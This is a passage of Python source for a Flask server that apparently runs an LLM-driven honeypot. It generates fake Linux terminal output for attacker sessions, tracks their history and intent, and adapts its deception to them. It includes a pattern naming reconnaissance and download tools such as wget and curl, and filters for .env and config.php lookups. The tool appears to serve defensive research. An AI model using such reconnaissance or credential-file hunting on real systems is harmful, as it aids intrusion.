    future_pat = re.compile(r"^\s*[#$]\s*(whoami|pwd|cat |ls |cd |sudo |wget |curl |grep |find |id|uname|ps )")
    for line in lines:
        if prompt_pat.match(line) or future_pat.match(line):
            break
        cleaned.append(line.rstrip())

    text = "\n".join(cleaned).strip()
    return repair_placeholders(text)


def unique_lines(output):
    seen = set()
    result = []
    for line in output.splitlines():
        if line.strip() not in seen:
            seen.add(line.strip())
            result.append(line)
    return "\n".join(result)


def apply_grep_filter(command, output):
    c = normalize_command(command)
    if "|" in c and "grep" in c:
        grep_part = c.split("grep", 1)[1].strip().strip("'\"").split()[0]
        if grep_part:
            return "\n".join(l for l in output.splitlines() if grep_part in l)
    return output


def postprocess(command, output):
    c = normalize_command(command).lower()
    output = unique_lines(output)
    output = repair_placeholders(output)

    if c.startswith("grep "):
        parts = normalize_command(command).split()
        if len(parts) >= 3:
            pattern = parts[1].strip("'\"")
            if pattern:
                output = "\n".join(l for l in output.splitlines() if pattern in l)

    if c.startswith("find "):
        lines = [l.strip() for l in output.splitlines() if l.strip().startswith("/")]
        if '".env"' in c or "'.env'" in c:
            lines = [l for l in lines if l.endswith("/.env")]
        elif '"*.bak"' in c or "*.bak" in c:
            lines = [l for l in lines if l.endswith(".bak")]
        elif '"config.php"' in c:
            lines = [l for l in lines if l.endswith("/config.php")]
        output = "\n".join(lines)

    return output.strip()


def output_invalid(command, output):
    c = normalize_command(command).lower()
    lines = [l.strip() for l in output.splitlines() if l.strip()]

    if not output and not c.startswith("grep ") and not c.startswith("find "):
        return True

    if c == "ps aux" and not output.startswith("USER"):
        return True
    if c == "ps -ef" and not output.startswith("UID"):
        return True

    if c.startswith("find "):
        for line in lines:
            if not line.startswith("/"):
                return True

    if c.startswith("grep "):
        parts = normalize_command(command).split()
        if len(parts) >= 3:
            pattern = parts[1].strip("'\"")
            for line in lines:
                if pattern and pattern not in line:
                    return True

    if c.startswith("ifconfig"):
        if "eth0" not in output and "ens" not in output:
            return True

    bad = ["as an ai", "i cannot", "language model", "here is", "```"]
    if any(x in output.lower() for x in bad):
        return True

    return False


def correction_hint(command, profile):
    c = normalize_command(command).lower()
    if c.startswith("find "):
        return "CORRECTION: Return ONLY absolute file paths matching the exact -name pattern. No explanations."
    if c.startswith("grep "):
        return "CORRECTION: Return ONLY lines containing the grep pattern. Do NOT return the full file."
    if c == "ps aux":
        return f"CORRECTION: Start with header: USER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMAND\nInclude only: {', '.join(profile['services'])}"
    if c == "ps -ef":
        return f"CORRECTION: Start with header: UID PID PPID C STIME TTY TIME CMD\nInclude only: {', '.join(profile['services'])}"
    return "CORRECTION: Return only correct raw Linux terminal output. No explanations."


# ============================================================
# MODEL GENERATION
# ============================================================

@torch.inference_mode()
def generate_response(command, user, hostname, cwd, profile_name, profile, vms,
                      history=None, temperature=0.2, extra_instruction=""):
    max_tokens = choose_max_tokens(command)

    # RAG: inject VMS state so model formats facts not invents them
    vms_context = vms.to_model_context()

    # Session history: what the attacker has already done
    history_context = history.to_model_context() if history else ""

    user_prompt = (
        f"{history_context}\n"
        f"{vms_context}\n"
        f"STATE:\n"
        f"profile={profile_name}\n"
        f"hostname={profile['hostname']}\n"
        f"user={user}\n"
        f"cwd={cwd}\n"
        f"os={profile['os']}\n"
        f"kernel={profile['kernel']}\n"
        f"webroot={profile['webroot']}\n"
        f"ip={profile['ip']}\n"
        f"mac={profile['mac']}\n"
        f"services={', '.join(profile['services'])}\n"
        f"open_ports={', '.join(map(str, profile['ports']))}\n"
        f"vulnerability={profile['vulnerability']}\n\n"
        f"RULES:\n"
        f"- Return ONLY raw terminal output.\n"
        f"- Use ONLY the services and ports listed above.\n"
        f"- Use the exact IP, MAC, and hostname from the profile.\n"
        f"- Stay consistent with the session history above.\n"
        f"- Never use placeholders like XX, YY, CHANGEME, fake_value.\n"
        f"- Never explain. Never use markdown.\n"
        f"{extra_instruction}\n\n"
        f"COMMAND:\n{command}"
    )

    messages = [
        {"role": "system", "content": SYSTEM_PROMPT},
        *build_few_shot_messages(),
        *(history.to_message_turns(max_turns=4) if history else []),
        {"role": "user",   "content": user_prompt},
    ]

    try:
        prompt = tokenizer.apply_chat_template(
            messages, tokenize=False, add_generation_prompt=True
        )
    except Exception:
        prompt = SYSTEM_PROMPT + "\n\n" + user_prompt + "\n"

    inputs = tokenizer(prompt, return_tensors="pt").to(model.device)

    # Generation settings. The ORIGINAL mild setting (penalty 1.08, no
    # no_repeat_ngram) produced excellent configs and is the default again.
    # Only list-style commands that genuinely loop (redis-cli keys) get a
    # slightly stronger penalty — but NOT no_repeat_ngram, which truncates
    # and corrupts configs.
    c_low = command.lower()
    is_list = any(lst in c_low for lst in
                  ["redis-cli", "keys *", "keys \"*\"", "keys '*'"])

    rep_penalty = 1.15 if is_list else 1.08

    outputs = model.generate(
        **inputs,
        max_new_tokens=max_tokens,
        do_sample=True,
        temperature=temperature,
        top_p=0.90,
        repetition_penalty=rep_penalty,
        pad_token_id=tokenizer.eos_token_id,
        eos_token_id=tokenizer.eos_token_id,
    )

    generated = outputs[0][inputs["input_ids"].shape[-1]:]
    text = tokenizer.decode(generated, skip_special_tokens=True)
    text = text.replace("<|im_end|>", "").replace("<|im_start|>", "")

    cleaned = sanitize_output(command, text)
    cleaned = apply_grep_filter(command, cleaned)
    cleaned = postprocess(command, cleaned)

    return cleaned, max_tokens


@torch.inference_mode()
def generate_with_validation(command, user, hostname, cwd, profile_name, profile, vms, history=None, temperature=0.2):
    temp = choose_temperature(command, temperature)

    output, max_tokens = generate_response(
        command, user, hostname, cwd, profile_name, profile, vms, history, temp
    )

    if not output_invalid(command, output):
        return output, max_tokens, "model"

    print(f"[!] Validation failed for: {command} — retrying")

    hint = correction_hint(command, profile)
    retry_output, retry_tokens = generate_response(
        command, user, hostname, cwd, profile_name, profile, vms, history,
        temperature=0.01, extra_instruction=hint
    )

    if not output_invalid(command, retry_output):
        return retry_output, retry_tokens, "model-retry"

    retry_output = postprocess(command, retry_output)
    return retry_output, retry_tokens, "model-retry-cleaned"


# ============================================================
# SERVE OUTPUT LOGGING
# (feeds pipeline.py for failure detection)
# ============================================================

def log_serve_output(command, output, source, profile_name, user, hostname, cwd):
    try:
        os.makedirs(os.path.dirname(SERVE_OUTPUT_LOG), exist_ok=True)
        with open(SERVE_OUTPUT_LOG, "a") as f:
            f.write(json.dumps({
                "command": command,
                "output": output,
                "source": source,
                "profile": profile_name,
                "user": user,
                "hostname": hostname,
                "cwd": cwd,
                "timestamp": time.time(),
            }) + "\n")
    except Exception as e:
        print(f"[!] Log error: {e}")


# ============================================================
# ROUTES
# ============================================================

@app.route("/", methods=["GET"])
def home():
    return jsonify({
        "status": "running",
        "model": MODEL_NAME,
        "profiles": list(FAKE_PROFILES.keys()),
        "cache_entries": len(COMMAND_CACHE),
        "active_sessions": len(SESSION_PROFILES),
    })


@app.route("/health", methods=["GET"])
def health():
    return jsonify({
        "status": "healthy",
        "model": MODEL_NAME,
        "base_model": BASE_MODEL,
        "adapter": ADAPTER_PATH,
        "cuda": torch.cuda.is_available(),
        "gpu": torch.cuda.get_device_name(0) if torch.cuda.is_available() else None,
        "cache_items": len(COMMAND_CACHE),
        "active_sessions": len(SESSION_PROFILES),
        "profiles": list(FAKE_PROFILES.keys()),
    })


@app.route("/sessions", methods=["GET"])
def sessions():
    """Show all active attacker sessions with full history summaries."""
    from session_history import get_all_summaries
    return jsonify({"sessions": get_all_summaries()})


@app.route("/session/<path:session_id>", methods=["GET"])
def session_detail(session_id):
    """Show full command history for one session."""
    from session_history import get_history
    hist = get_history(session_id)
    if hist is None:
        return jsonify({"error": "session not found"}), 404
    return jsonify(hist.to_dict())


@app.route("/v1/chat/completions", methods=["POST"])
def chat_completions():
    body = request.get_json(force=True)

    raw_text = extract_command_from_messages(body.get("messages", []))
    command  = extract_real_command(raw_text)
    user     = detect_user(raw_text)
    orig_hostname = detect_hostname(raw_text)
    cwd      = detect_cwd(raw_text, user)

    session_id = get_session_id(user, orig_hostname, cwd, command)
    profile_name, profile = get_session_profile(session_id)
    hostname = profile["hostname"]

    # Get or create virtual machine state + session history for this session
    vms     = get_or_create_state(session_id, profile_name, profile)
    history = get_or_create_history(session_id, profile_name, profile)

    # Use session history to resolve cwd/user from prior cd/su commands
    cwd  = resolve_current_cwd(session_id, cwd)
    user = resolve_current_user(session_id, user)

    # Fix cwd for known users (only if no history-tracked cwd)
    if cwd == "/" and user in ["www-data", "ubuntu"]:
        cwd = profile["webroot"]

    temperature = float(body.get("temperature", 0.2))
    start = time.time()
    source = "unknown"

    # ── 1. Cache check ──────────────────────────────────────
    cached = get_cached_output(profile_name, user, hostname, cwd, command)
    if cached is not None:
        output, max_tokens, orig_source = cached
        source = f"cache:{orig_source}"

    else:
        # ── 2. Hard rule check ───────────────────────────────
        hard_output = hard_rule_response(
            command, user, hostname, cwd, profile,
            session_id=session_id, vfs=vms.files
        )

        if hard_output is not None:
            output = hard_output
            max_tokens = 0
            source = "hard-rule"

        else:
            # ── 3. Model generation (with session history) ───
            output, max_tokens, source = generate_with_validation(
                command, user, hostname, cwd,
                profile_name, profile, vms, history, temperature
            )

        save_cached_output(
            profile_name, user, hostname, cwd,
            command, output, max_tokens, source
        )

    # ── Record command in session history ────────────────────
    history.record(command, output, source)

    # ── ADAPTIVE DECEPTION (Type B) ──────────────────────────
    # Morph the attack surface based on the attacker's detected intent.
    current_intent = history.get_current_intent()
    deception_changes = vms.adapt_to_intent(current_intent)
    if deception_changes:
        for ch in deception_changes:
            print(f"[DECEPTION] intent={current_intent}: {ch}")

    save_all_histories()   # persist to disk so state survives restarts

    elapsed = round(time.time() - start, 2)

    # ── Log for pipeline.py ──────────────────────────────────
    log_serve_output(command, output, source, profile_name, user, hostname, cwd)

    # ── Terminal debug output ────────────────────────────────
    print("=" * 80)
    print(f"SOURCE:   {source}")
    print(f"PROFILE:  {profile_name}  ({profile['description']})")
    print(f"USER:     {user}  |  HOSTNAME: {hostname}  |  CWD: {cwd}")
    print(f"COMMAND:  {command}")
    print(f"INTENT:   {history.get_current_intent()}")
    print(f"TOKENS:   {max_tokens}  |  TIME: {elapsed}s")
    print(f"OUTPUT:\n{output}")
    print("=" * 80)

    return jsonify({
        "id": f"chatcmpl-{int(time.time())}",
        "object": "chat.completion",
        "created": int(time.time()),
        "model": MODEL_NAME,
        "choices": [{
            "index": 0,
            "message": {"role": "assistant", "content": output},
            "finish_reason": "stop",
        }],
    })


# ============================================================
# START
# ============================================================

if __name__ == "__main__":
    print(f"[+] Starting {MODEL_NAME} on {HOST}:{PORT}")
    app.run(host=HOST, port=PORT, debug=False)